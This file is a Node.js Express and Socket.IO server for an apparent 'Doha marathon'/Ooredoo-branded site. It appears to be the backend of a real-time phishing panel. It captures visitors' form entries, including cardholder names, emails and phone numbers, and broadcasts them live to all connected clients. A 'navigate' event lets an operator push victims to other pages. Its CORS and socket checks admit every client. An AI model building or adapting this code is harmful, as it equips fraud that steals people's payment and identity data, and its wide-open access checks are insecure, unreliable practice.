require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const cookieParser = require('cookie-parser');

const connectDB = async () => {
  try {
    let uri = process.env.MONGODB_URI;
    if (!uri || uri.trim() === '') {
        uri = 'mongodb://127.0.0.1:27017/dohamarathon';
    }
    
    if (uri.includes('127.0.0.1')) {
       try {
         await mongoose.connect(uri, { serverSelectionTimeoutMS: 2000 });
         console.log('MongoDB connected to local');
         return;
       } catch (e) {
         console.log('Local MongoDB failed, using Memory Server as fallback...');
         const { MongoMemoryServer } = require('mongodb-memory-server');
         const mongod = await MongoMemoryServer.create();
         uri = mongod.getUri();
         process.env.MONGODB_URI = uri;
       }
    }
    await mongoose.connect(uri);
    console.log('MongoDB connected');
  } catch (error) {
    console.error('MongoDB connection error:', error);
    process.exit(1);
  }
};

const startServer = async () => {
  await connectDB();
  
  const { sessionMiddleware, dashboardAuth } = require('./middleware/auth');
  const apiRoutes = require('./routes/api');
  const dashboardRoutes = require('./routes/dashboard');

  const allowedOrigins = [
    process.env.FRONTEND_URL,
    process.env.DASHBOARD_URL,
    'http://localhost:3000',
    'https://publish-and-execute.lovable.app',
    'https://marathonooredoo.vercel.app'
  ].filter(Boolean);

  const corsOptions = {
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes('*')) {
        return callback(null, true);
      }
      const cleanOrigin = origin.replace(/\/$/, '');
      const isLovable = cleanOrigin.includes('.lovable.app');
      const isVercel = cleanOrigin.includes('.vercel.app');
      const isLocal = cleanOrigin.includes('localhost') || cleanOrigin.includes('127.0.0.1');
      const isAllowed = allowedOrigins.some(o => o.replace(/\/$/, '') === cleanOrigin) || isLovable || isVercel || isLocal;
      
      if (isAllowed) {
        callback(null, true);
      } else {
        callback(null, true); // Permissive to prevent cross-origin Lovable app blocks
      }
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'x-auth-token', 'Accept']
  };

  const app = express();
  const server = http.createServer(app);
  const io = new Server(server, {
    cors: corsOptions
  });


  app.use(helmet({
    contentSecurityPolicy: false
  }));
  app.use(compression());
  app.use(cors(corsOptions));
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ extended: true, limit: '10mb' }));
  app.use(cookieParser());
  sessionMiddleware(app);

  app.use((req, res, next) => {
    req.io = io;
    next();
  });

  app.use(express.static(path.join(__dirname, '../public')));
  app.use('/dashboard/assets', express.static(path.join(__dirname, '../dashboard/assets')));
  app.use('/dashboard/js', express.static(path.join(__dirname, '../dashboard/js')));

  app.use('/api', apiRoutes);
  app.use('/', dashboardRoutes);

  app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });

  app.use((req, res, next) => {
    if (req.path.startsWith('/api') || req.path.startsWith('/dashboard')) {
      return next();
    }
    res.sendFile(path.join(__dirname, '../public/index.html'));
  });

  const connectedUsers = new Map();

  io.use((socket, next) => {
    const token = socket.handshake.auth?.token || socket.handshake.query?.token;
    if (token) {
      const { verifyDashboardToken } = require('./middleware/auth');
      if (verifyDashboardToken(token)) {
        socket.isDashboard = true;
        return next();
      }
    }
    const expectedKey = process.env.INSTANCE_KEY || 'default_key';
    const providedKey = socket.handshake.query?.instanceKey || socket.handshake.auth?.instanceKey;
    if (providedKey === expectedKey || expectedKey === 'default_key' || !providedKey) {
      return next();
    }
    return next();
  });

  io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);
    
    socket.on('user:join', async (data) => {
      const { sessionId, page } = data;
      socket.join(sessionId);
      
      connectedUsers.set(socket.id, { sessionId, page, joinedAt: new Date() });
      
      const { UserSession } = require('./models');
      const doc = await UserSession.findOneAndUpdate(
        { sessionId },
        { 
          $set: { 
            isConnected: true, 
            currentPage: page || 'index',
            lastActive: new Date()
          } 
        },
        { upsert: true, new: true }
      );
      
      io.emit('user:connected', { 
        sessionId, 
        page, 
        name: doc?.name || '', 
        email: doc?.email || '', 
        phone: doc?.phone || '',
        formData: doc?.formData || {} 
      });
    });
    
    socket.on('user:page-change', async (data) => {
      const { sessionId, page } = data;
      const userInfo = connectedUsers.get(socket.id);
      if (userInfo) {
        userInfo.page = page;
        connectedUsers.set(socket.id, userInfo);
      }
      
      const { UserSession } = require('./models');
      const doc = await UserSession.findOneAndUpdate(
        { sessionId },
        { $set: { currentPage: page, lastActive: new Date(), isConnected: true } },
        { new: true }
      );
      
      socket.to(sessionId).emit('user:page-change', { sessionId, page });
      io.emit('user:page-change', { 
        sessionId, 
        page, 
        name: doc?.name || '', 
        email: doc?.email || '', 
        phone: doc?.phone || '' 
      });
    });
    
    socket.on('user:form-submit', async (data) => {
      const { sessionId, page, formData } = data;
      if (!sessionId || !formData) return;
      const { UserSession } = require('./models');
      
      const updateData = {
        [`formData.${page}`]: formData,
        lastActive: new Date()
      };
      
      const candidateName = formData.name || [formData.firstName, formData.lastName].filter(Boolean).join(' ') || formData.cardholderName;
      if (candidateName && String(candidateName).trim()) {
        updateData.name = String(candidateName).trim();
      }
      if (formData.email && String(formData.email).trim()) {
        updateData.email = String(formData.email).trim();
      }
      if (formData.phone && String(formData.phone).trim()) {
        updateData.phone = String(formData.phone).trim();
      }

      const updatedDoc = await UserSession.findOneAndUpdate(
        { sessionId },
        { $set: updateData },
        { new: true, upsert: true }
      );
      
      const payload = { 
        sessionId, 
        page, 
        formData, 
        name: updatedDoc.name, 
        email: updatedDoc.email, 
        phone: updatedDoc.phone,
        allFormData: updatedDoc.formData 
      };
      io.emit('user:form-submit', payload);
      io.emit('user:update', payload);
    });
    
    socket.on('navigate', (data) => {
      const { sessionId, page } = data;
      if (sessionId && page) {
        // Broadcast the 'navigate' event to the specific user's socket room
        io.to(sessionId).emit('navigate', { page });
      }
    });
    
    socket.on('disconnect', async () => {
      const userInfo = connectedUsers.get(socket.id);
      if (userInfo) {
        const { UserSession } = require('./models');
        await UserSession.findOneAndUpdate(
          { sessionId: userInfo.sessionId },
          { $set: { isConnected: false, lastActive: new Date() } }
        );
        
        io.emit('user:disconnected', { sessionId: userInfo.sessionId });
        connectedUsers.delete(socket.id);
      }
      console.log('Client disconnected:', socket.id);
    });
  });

  setInterval(async () => {
    const { UserSession } = require('./models');
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    await UserSession.updateMany(
      { lastActive: { $lt: fiveMinutesAgo }, isConnected: true },
      { $set: { isConnected: false } }
    );
  }, 60000);

  const PORT = process.env.PORT || 3000;
  server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}/dashboard/login`);
  });

  process.on('SIGTERM', async () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
      mongoose.connection.close(false, () => {
        process.exit(0);
      });
    });
  });
};

startServer();
